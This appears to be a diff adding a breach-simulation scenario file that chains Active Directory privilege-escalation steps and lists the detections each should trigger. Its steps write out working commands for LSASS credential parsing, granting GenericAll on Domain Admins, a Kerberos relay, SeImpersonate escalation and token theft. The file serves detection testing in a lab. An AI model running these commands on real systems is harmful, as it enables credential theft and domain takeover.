@@ -1,0 +1,266 @@
+scenario_id: SIM-ITDR-007
+name: "ITDR — AD Privilege Escalation & Token Manipulation Chain (LSASS → DACL → Kerberos Relay → SeImpersonate → Token Theft)"
+version: "1.0"
+status: active
+
+plane: ITDR
+detection_types:
+  - BIOC
+  - XQL
+  - Correlation
+
+uc_ref: UCS-ITDR-07
+tc_ref: TC-ITDR-07
+uc_name: "Active Directory Privilege Escalation & Token Manipulation Detection"
+tc_name: "Post-Compromise Local-to-Domain Privilege Escalation Chain On A Domain Workstation"
+
+mitre_tactic: "TA0004"
+mitre_tactic_name: "Privilege Escalation"
+mitre_technique: "T1068"
+mitre_technique_name: "Exploitation for Privilege Escalation"
+additional_techniques:
+  - technique: "T1134"
+    name: "Access Token Manipulation"
+  - technique: "T1003.001"
+    name: "OS Credential Dumping: LSASS Memory"
+  - technique: "T1098"
+    name: "Account Manipulation"
+  - technique: "T1550"
+    name: "Use Alternate Authentication Material"
+  - technique: "T1078"
+    name: "Valid Accounts"
+
+threat_report: "Unit42 - Active Directory Attack Paths"
+threat_report_url: "https://unit42.paloaltonetworks.com/active-directory-attack-paths/"
+
+execution_identity:
+  default: root
+  options:
+    - root
+
+push_supported: true
+pull_supported: true
+
+required_content:
+  - repo: "skelsec/pypykatz"
+  - repo: "CravateRouge/bloodyAD"
+  - repo: "Dec0ne/KrbRelayUp"
+  - repo: "itm4n/PrintSpoofer"
+  - repo: "0xbadjuju/Tokenvator"
+
+infra_modules_needed:
+  - base
+  - itdr
+
+# ── v2.0 KPI / Methodology Metadata ─────────────────────────────────────────
+# Rolled out per the S-07 per-plane convention (docs/uc_tc_mapping/
+# scenario-methodology-defaults.md). Identity-plane detection-accuracy family.
+validation_methodology: "Identity Privilege-Escalation Signal Injection & Detection Accuracy"
+methodology_family: "F1"
+primary_kpi: "Detection Accuracy"
+threshold:
+  kpi: "Detection Accuracy"
+  op: "≥"
+  value: 90
+  unit: "%"
+success_criteria: |
+  Each privilege-escalation step raises its expected Cortex ITDR/XDR detection —
+  LSASS handle-open by a non-system process, an abnormal DACL write to a
+  privileged AD object, a local Kerberos relay (KrbRelayUp), a SeImpersonate
+  named-pipe escalation to SYSTEM, and an access-token theft/impersonation — and
+  the chain stitches into one Privilege Escalation incident via CR-ITDR-0007.
+  Detection Accuracy is the share of injected escalation events that raise the
+  expected alert (target ≥ 90%).
+moat_tier: "MOAT"
+
+# ── Consent / safety ────────────────────────────────────────────────────────
+# This scenario detonates real, dual-use Windows privilege-escalation and
+# token-manipulation tooling against the Active Directory lab the `itdr` IaC
+# module provisions (DC + domain-joined workstations). It references the
+# dual-use-lab-only adapters TOOL-PYPYKATZ, TOOL-BLOODYAD, TOOL-KRBRELAYUP,
+# TOOL-PRINTSPOOFER and TOOL-TOKENVATOR. The orchestrator's adapter consent gate
+# (core/engine/orchestrator.py::_check_adapter_consent) REFUSES to launch without
+# consent.simulation_authorized=true at launch. Each step also carries a
+# demo-mode fallback so the bundle is safe to run where the lab is absent (the
+# command echoes its intent and exits 0 rather than erroring). Execute ONLY
+# against the authorised CortexSim AD lab — destroy the environment after the POV.
+
+external_tools:
+  - name: pypykatz
+    source: "https://github.com/skelsec/pypykatz"
+    type: script
+    install_inline: false
+    adapter_ref: TOOL-PYPYKATZ
+  - name: bloodyAD
+    source: "https://github.com/CravateRouge/bloodyAD"
+    type: script
+    install_inline: false
+    adapter_ref: TOOL-BLOODYAD
+  - name: KrbRelayUp
+    source: "https://github.com/Dec0ne/KrbRelayUp"
+    type: binary
+    install_inline: false
+    adapter_ref: TOOL-KRBRELAYUP
+  - name: PrintSpoofer
+    source: "https://github.com/itm4n/PrintSpoofer"
+    type: binary
+    install_inline: false
+    adapter_ref: TOOL-PRINTSPOOFER
+  - name: Tokenvator
+    source: "https://github.com/0xbadjuju/Tokenvator"
+    type: binary
+    install_inline: false
+    adapter_ref: TOOL-TOKENVATOR
+
+steps:
+  - id: step-01
+    name: "LSASS memory harvest — parse credentials from a dumped LSASS image with pypykatz"
+    command: |
+      echo '[ITDR-007] LSASS credential parse via pypykatz (T1003.001)';
+      DC_IP="${CORTEXSIM_DC_IP:-10.0.10.10}";
+      WS_HOST="${CORTEXSIM_WS_HOST:-WS01}";
+      LSASS_DUMP="${CORTEXSIM_LSASS_DUMP:-/tmp/cortexsim_itdr007_lsass.dmp}";
+      echo "[*] Target workstation: $WS_HOST  DC: $DC_IP";
+      command -v pypykatz >/dev/null 2>&1 && [ -f "$LSASS_DUMP" ] \
+        && pypykatz lsa minidump "$LSASS_DUMP" 2>&1 | tee /tmp/cortexsim_itdr007_creds.txt | head -30 \
+        || echo '[*] demo-mode: pypykatz not installed or no LSASS dump present — XDR should still flag the upstream LSASS process-handle open';
+      echo '[*] XDR should flag a non-system process opening a handle to lsass.exe (credential dumping)'
+    identity: root
+    mitre_technique: "T1003.001"
+    expected_detections:
+      - plane: ITDR
+        type: BIOC
+        description: "XDR — a non-system process opens a process handle to lsass.exe with credential-read access (LSASS memory credential dumping)"
+        ttp_ref: "TTP-2026-0078"
+        detection_id: "bioc-itdr-007-lsass-process-handle-open-by-non-system-process"
+      - plane: ITDR
+        type: XQL
+        description: "XDR — validation: LSASS credential-access handle from a non-system process observed in the last window"
+        ttp_ref: "TTP-2026-0078"
+        detection_id: "xql-itdr-007-validate-lsass-credential-access-by-non-system-process"
+
+  - id: step-02
+    name: "AD DACL abuse — grant GenericAll on a privileged object via bloodyAD"
+    command: |
+      echo '[ITDR-007] AD ACL/DACL abuse via bloodyAD (T1098 / privilege escalation)';
+      DC_IP="${CORTEXSIM_DC_IP:-10.0.10.10}";
+      DOMAIN="${CORTEXSIM_DOMAIN:-cortexsim.local}";
+      WS_USER="${CORTEXSIM_WS_USER:-cortexsim\\\\helpdesk-admin}";
+      WS_PWD="${CORTEXSIM_WS_PWD:-PlaceholderForDemo}";
+      command -v bloodyAD >/dev/null 2>&1 \
+        && bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$WS_USER" -p "$WS_PWD" \
+             add genericAll "CN=Domain Admins,CN=Users,DC=cortexsim,DC=local" "$WS_USER" 2>&1 | tee /tmp/cortexsim_itdr007_dacl.txt | head -20 \
+        || echo '[*] demo-mode: bloodyAD not installed — ITDR should still flag the abnormal DACL write to the privileged object';
+      echo '[*] ITDR should flag an abnormal nTSecurityDescriptor / DACL write granting rights on a privileged group'
+    identity: root
+    mitre_technique: "T1098"
+    expected_detections:
+      - plane: ITDR
+        type: BIOC
+        description: "ITDR — abnormal DACL / nTSecurityDescriptor write granting GenericAll/WriteDACL on AdminSDHolder or a privileged group (ACL-based escalation)"
+        ttp_ref: "TTP-2026-0078"
+        detection_id: "bioc-itdr-007-abnormal-dacl-write-to-adminsdholder-or-privileged-group"
+      - plane: ITDR
+        type: XQL
+        description: "ITDR — validation: privileged-object DACL modification (4662 directory-service write) observed in the last window"
+        ttp_ref: "TTP-2026-0078"
+        detection_id: "xql-itdr-007-validate-abnormal-privileged-dacl-modification"
+
+  - id: step-03
+    name: "Kerberos relay local privilege escalation — KrbRelayUp against the local machine"
+    command: |
+      echo '[ITDR-007] Kerberos relay local privesc via KrbRelayUp (T1550 / T1068)';
+      DC_IP="${CORTEXSIM_DC_IP:-10.0.10.10}";
+      DOMAIN="${CORTEXSIM_DOMAIN:-cortexsim.local}";
+      WS_HOST="${CORTEXSIM_WS_HOST:-WS01}";
+      command -v KrbRelayUp.exe >/dev/null 2>&1 \
+        && KrbRelayUp.exe relay -d "$DOMAIN" -cls 2>&1 | tee /tmp/cortexsim_itdr007_krbrelay.txt | head -20 \
+        || echo '[*] demo-mode: KrbRelayUp.exe not present — ITDR should still flag the local Kerberos relay (self-relay to LDAP) tradecraft';
+      echo '[*] ITDR should flag a Kerberos relay from the local host to LDAP / a machine-account RBCD edit (KrbRelayUp)'
+    identity: root
+    mitre_technique: "T1550"
+    expected_detections:
+      - plane: ITDR
+        type: BIOC
+        description: "ITDR — local Kerberos relay to LDAP from the same host (self-relay / RBCD machine-account abuse — KrbRelayUp local privilege escalation)"
+        ttp_ref: "TTP-2026-0078"
+        detection_id: "bioc-itdr-007-kerberos-relay-to-ldap-from-local-host-krbrelayup"
+
+  - id: step-04
+    name: "SeImpersonate token abuse — PrintSpoofer named-pipe escalation to SYSTEM"
+    command: |
+      echo '[ITDR-007] SeImpersonate named-pipe escalation via PrintSpoofer (T1134)';
+      WS_HOST="${CORTEXSIM_WS_HOST:-WS01}";
+      command -v PrintSpoofer64.exe >/dev/null 2>&1 \
+        && PrintSpoofer64.exe -i -c whoami 2>&1 | tee /tmp/cortexsim_itdr007_printspoofer.txt | head -10 \
+        || echo '[*] demo-mode: PrintSpoofer64.exe not present — XDR should still flag a service account (SeImpersonatePrivilege) spawning a SYSTEM child via a named pipe';
+      echo '[*] XDR should flag a SeImpersonate-holding service process spawning a SYSTEM child via named-pipe impersonation'
+    identity: root
+    mitre_technique: "T1134"
+    expected_detections:
+      - plane: ITDR
+        type: BIOC
+        description: "XDR — a SeImpersonatePrivilege service account spawns a SYSTEM child process via named-pipe token impersonation (PrintSpoofer/potato escalation)"
+        ttp_ref: "TTP-2026-0078"
+        detection_id: "bioc-itdr-007-seimpersonate-named-pipe-privilege-escalation-to-system"
+      - plane: ITDR
+        type: XQL
+        description: "XDR — validation: a SYSTEM-integrity child spawned from a non-system service-account parent observed in the last window"
+        ttp_ref: "TTP-2026-0078"
+        detection_id: "xql-itdr-007-validate-system-token-spawned-from-service-account-process"
+
+  - id: step-05
+    name: "Access token theft — duplicate and impersonate a SYSTEM/privileged token via Tokenvator"
+    command: |
+      echo '[ITDR-007] Access token theft and impersonation via Tokenvator (T1134)';
+      WS_HOST="${CORTEXSIM_WS_HOST:-WS01}";
+      command -v Tokenvator.exe >/dev/null 2>&1 \
+        && Tokenvator.exe Steal_Token 4 winlogon.exe 2>&1 | tee /tmp/cortexsim_itdr007_tokenvator.txt | head -15 \
+        || echo '[*] demo-mode: Tokenvator.exe not present — XDR should still flag the token duplication/impersonation from a high-privilege process';
+      echo '[*] XDR should flag a process duplicating and impersonating the access token of a privileged process (token theft)'
+    identity: root
+    mitre_technique: "T1134"
+    expected_detections:
+      - plane: ITDR
+        type: BIOC
+        description: "XDR — a process duplicates and impersonates the access token of a privileged/SYSTEM process (token theft via DuplicateTokenEx/ImpersonateLoggedOnUser)"
+        ttp_ref: "TTP-2026-0078"
+        detection_id: "bioc-itdr-007-access-token-theft-and-impersonation-via-token-duplication"
+
+  - id: step-06
+    name: "Validate the full local-to-SYSTEM escalation chain stitched into one incident"
+    command: |
+      echo '[ITDR-007] Chain validation — LSASS → DACL → Kerberos relay → SeImpersonate → token theft';
+      echo '[*] XSIAM correlation CR-ITDR-0007 should group the escalation steps into a single Privilege Escalation incident';
+      echo '[*] Validation XQL confirms a SYSTEM-integrity process descended from a non-system service-account parent within the window'
+    identity: root
+    mitre_technique: "T1068"
+    expected_detections:
+      - plane: ITDR
+        type: XQL
+        description: "XDR — validation: a local privilege-escalation chain terminating at SYSTEM integrity observed in the last window"
+        ttp_ref: "TTP-2026-0078"
+        detection_id: "xql-itdr-007-validate-local-privilege-escalation-chain-to-system"
+      - plane: ITDR
+        type: Correlation
+        description: "XSIAM — LSASS access + privileged DACL write + Kerberos relay + SeImpersonate/token theft from one host stitched into a single Privilege Escalation incident"
+        ttp_ref: "TTP-2026-0078"
+        detection_id: "CR-ITDR-0007"
+
+cleanup:
+  commands:
+    - "rm -f /tmp/cortexsim_itdr007_creds.txt /tmp/cortexsim_itdr007_dacl.txt /tmp/cortexsim_itdr007_krbrelay.txt /tmp/cortexsim_itdr007_printspoofer.txt /tmp/cortexsim_itdr007_tokenvator.txt /tmp/cortexsim_itdr007_lsass.dmp"
+    - "echo '[CortexSim] SIM-ITDR-007 cleanup complete — revert any DACL change via terraform destroy / AD restore'"
+
+author: "Henry Reed"
+created: "2026-06-15"
+last_updated: "2026-06-15"
+tags:
+  - itdr
+  - active-directory
+  - privilege-escalation
+  - token-manipulation
+  - lsass
+  - seimpersonate
+  - kerberos-relay
+  - adapter-gated
